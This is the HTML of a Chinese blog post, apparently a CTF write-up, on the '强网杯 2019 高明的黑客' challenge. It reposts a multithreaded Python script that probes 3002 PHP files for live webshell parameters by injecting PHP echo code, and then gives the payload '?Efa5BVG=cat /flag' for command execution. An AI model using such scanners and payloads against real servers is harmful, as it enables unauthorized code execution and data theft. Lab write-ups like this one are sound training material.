@@ -1,32 +1,204 @@
-extends includes/layout.pug
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>BUU每日一题028 | lll-nnnのblog</title><meta name="keywords" content="wp"><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="二十八、题目[强网杯 2019]高明的黑客       分析访问www.tar.gz得到一个压缩包，里面有3002个PHP文件，有shell，应该是只有一个是有效的吧，所以考的应该是python写脚本的能力了          解大佬的脚本       import os import requests import re import threading import time print(&amp;#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUU每日一题028">
+<meta property="og:url" content="http://lll-nnn.github.io/2021/02/11/BUU028/index.html">
+<meta property="og:site_name" content="lll-nnnのblog">
+<meta property="og:description" content="二十八、题目[强网杯 2019]高明的黑客       分析访问www.tar.gz得到一个压缩包，里面有3002个PHP文件，有shell，应该是只有一个是有效的吧，所以考的应该是python写脚本的能力了          解大佬的脚本       import os import requests import re import threading import time print(&amp;#">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2021-02-11T15:04:30.000Z">
+<meta property="article:modified_time" content="2021-02-11T15:18:59.096Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://lll-nnn.github.io/2021/02/11/BUU028/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-02-11 23:18:59'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
-block content
-  #post
-    if top_img === false
-      include includes/header/post-info.pug
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
 
-    article#article-container.post-content!=page.content
-    include includes/post/post-copyright.pug
-    .tag_share
-      if (theme.post_meta.post.tags)
-        .post-meta__tag-list
-          each item, index in page.tags.data
-            a(href=url_for(item.path)).post-meta__tags #[=item.name]
-      include includes/third-party/share/index.pug
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
         
-    if theme.reward.enable
-      !=partial('includes/post/reward', {}, {cache: true})
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">57</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">lll-nnnのblog</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">BUU每日一题028</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-02-11T15:04:30.000Z" title="发表于 2021-02-11 23:04:30">2021-02-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-02-11T15:18:59.096Z" title="更新于 2021-02-11 23:18:59">2021-02-11</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="二十八、"><a href="#二十八、" class="headerlink" title="二十八、"></a>二十八、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[强网杯 2019]高明的黑客<br><img src="https://ae04.alicdn.com/kf/H0c5d474d5be84e36bf49ea28ff95588fv.jpg" alt="02.png">      </p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>访问<code>www.tar.gz</code>得到一个压缩包，里面有3002个PHP文件，<img src="https://ae04.alicdn.com/kf/Hf19fd81889a14126917af7acb6db6830p.jpg" alt="03.png"><br>有shell，应该是只有一个是有效的吧，所以考的应该是python写脚本的能力了         </p>
+<h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/a3320315/article/details/102945940">大佬</a>的脚本      </p>
+<pre><code>import os
+import requests
+import re
+import threading
+import time
+print(&#39;开始时间：  &#39;+  time.asctime( time.localtime(time.time()) ))
+s1=threading.Semaphore(100)                                            #这儿设置最大的线程数
+filePath = r&quot;D:/soft/phpstudy/PHPTutorial/WWW/src/&quot;
+os.chdir(filePath)                                                    #改变当前的路径
+requests.adapters.DEFAULT_RETRIES = 5                                #设置重连次数，防止线程数过高，断开连接
+files = os.listdir(filePath)
+session = requests.Session()
+session.keep_alive = False                                             # 设置连接活跃状态为False
+def get_content(file):
+    s1.acquire()                                                
+    print(&#39;trying   &#39;+file+ &#39;     &#39;+ time.asctime( time.localtime(time.time()) ))
+    with open(file,encoding=&#39;utf-8&#39;) as f:                            #打开php文件，提取所有的$_GET和$_POST的参数
+            gets = list(re.findall(&#39;\$_GET\[\&#39;(.*?)\&#39;\]&#39;, f.read()))
+            posts = list(re.findall(&#39;\$_POST\[\&#39;(.*?)\&#39;\]&#39;, f.read()))
+    data = &#123;&#125;                                                        #所有的$_POST
+    params = &#123;&#125;                                                        #所有的$_GET
+    for m in gets:
+        params[m] = &quot;echo &#39;xxxxxx&#39;;&quot;
+    for n in posts:
+        data[n] = &quot;echo &#39;xxxxxx&#39;;&quot;
+    url = &#39;http://127.0.0.1/src/&#39;+file
+    req = session.post(url, data=data, params=params)            #一次性请求所有的GET和POST
+    req.close()                                                # 关闭请求  释放内存
+    req.encoding = &#39;utf-8&#39;
+    content = req.text
+    #print(content)
+    if &quot;xxxxxx&quot; in content:                                    #如果发现有可以利用的参数，继续筛选出具体的参数
+        flag = 0
+        for a in gets:
+            req = session.get(url+&#39;?%s=&#39;%a+&quot;echo &#39;xxxxxx&#39;;&quot;)
+            content = req.text
+            req.close()                                                # 关闭请求  释放内存
+            if &quot;xxxxxx&quot; in content:
+                flag = 1
+                break
+        if flag != 1:
+            for b in posts:
+                req = session.post(url, data=&#123;b:&quot;echo &#39;xxxxxx&#39;;&quot;&#125;)
+                content = req.text
+                req.close()                                                # 关闭请求  释放内存
+                if &quot;xxxxxx&quot; in content:
+                    break
+        if flag == 1:                                                    #flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，
+            param = a
+        else:
+            param = b
+        print(&#39;找到了利用文件： &#39;+file+&quot;  and 找到了利用的参数：%s&quot; %param)
+        print(&#39;结束时间：  &#39; + time.asctime(time.localtime(time.time())))
+    s1.release()
 
-    //- ad
-    if theme.ad && theme.ad.post
-      .ads-wrap!=theme.ad.post
-
-    if theme.post_pagination
-      include includes/pagination.pug
-    if theme.related_post && theme.related_post.enable
-      != related_posts(page,site.posts)
-
-    if page.comments !== false && theme.comments && theme.comments.use
-      - var commentsJsLoad = true
-      !=partial('includes/third-party/comments/index', {}, {cache: true})
-      
+for i in files:                                                            #加入多线程
+   t = threading.Thread(target=get_content, args=(i,))
+   t.start()</code></pre>
+<p>运行<br><img src="https://sc03.alicdn.com/kf/Hdef4496632754ec3885fb3bc8cfd8668W.jpg" alt="04.png"><br>payload：<code>/xk0SzyKwfzw.php?Efa5BVG=cat /flag</code>得到flag<img src="https://ae02.alicdn.com/kf/H85c10a4376734c50af5ce78f50a844700.jpg" alt="01.png"> </p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://lll-nnn.github.io/2021/02/11/BUU028/">http://lll-nnn.github.io/2021/02/11/BUU028/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://lll-nnn.github.io" target="_blank">lll-nnnのblog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/wp/">wp</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/02/12/BUU029/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">BUU每日一题029</div></div></a></div><div class="next-post pull-right"><a href="/2021/02/10/BUU027/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">BUU每日一题027</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/01/15/BUU001/" title="BUU每日一题001"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-15</div><div class="title">BUU每日一题001</div></div></a></div><div><a href="/2021/01/17/BUU003/" title="BUU每日一题003"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-17</div><div class="title">BUU每日一题003</div></div></a></div><div><a href="/2021/01/16/BUU002/" title="BUU每日一题002"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-16</div><div class="title">BUU每日一题002</div></div></a></div><div><a href="/2021/01/18/BUU004/" title="BUU每日一题004"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-18</div><div class="title">BUU每日一题004</div></div></a></div><div><a href="/2021/01/19/BUU005/" title="BUU每日一题005"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-19</div><div class="title">BUU每日一题005</div></div></a></div><div><a href="/2021/01/20/BUU006/" title="BUU每日一题006"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-20</div><div class="title">BUU每日一题006</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/null" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">John Doe</div><div class="author-info__description">BLOG</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">57</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E5%8D%81%E5%85%AB%E3%80%81"><span class="toc-number">1.</span> <span class="toc-text">二十八、</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3"><span class="toc-number">1.3.</span> <span class="toc-text">解</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/02/27/BUU039/" title="BUU每日一题039"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUU每日一题039"/></a><div class="content"><a class="title" href="/2021/02/27/BUU039/" title="BUU每日一题039">BUU每日一题039</a><time datetime="2021-02-27T06:50:16.000Z" title="发表于 2021-02-27 14:50:16">2021-02-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/26/BUU038/" title="BUU每日一题038"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUU每日一题038"/></a><div class="content"><a class="title" href="/2021/02/26/BUU038/" title="BUU每日一题038">BUU每日一题038</a><time datetime="2021-02-26T06:20:31.000Z" title="发表于 2021-02-26 14:20:31">2021-02-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/25/BUU037/" title="BUU每日一题037"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUU每日一题037"/></a><div class="content"><a class="title" href="/2021/02/25/BUU037/" title="BUU每日一题037">BUU每日一题037</a><time datetime="2021-02-25T05:55:34.000Z" title="发表于 2021-02-25 13:55:34">2021-02-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/24/hgameweek3/" title="Hgameweek3"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hgameweek3"/></a><div class="content"><a class="title" href="/2021/02/24/hgameweek3/" title="Hgameweek3">Hgameweek3</a><time datetime="2021-02-24T12:15:42.000Z" title="发表于 2021-02-24 20:15:42">2021-02-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/24/BUU036/" title="BUU每日一题036"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUU每日一题036"/></a><div class="content"><a class="title" href="/2021/02/24/BUU036/" title="BUU每日一题036">BUU每日一题036</a><time datetime="2021-02-24T06:14:10.000Z" title="发表于 2021-02-24 14:14:10">2021-02-24</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By John Doe</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
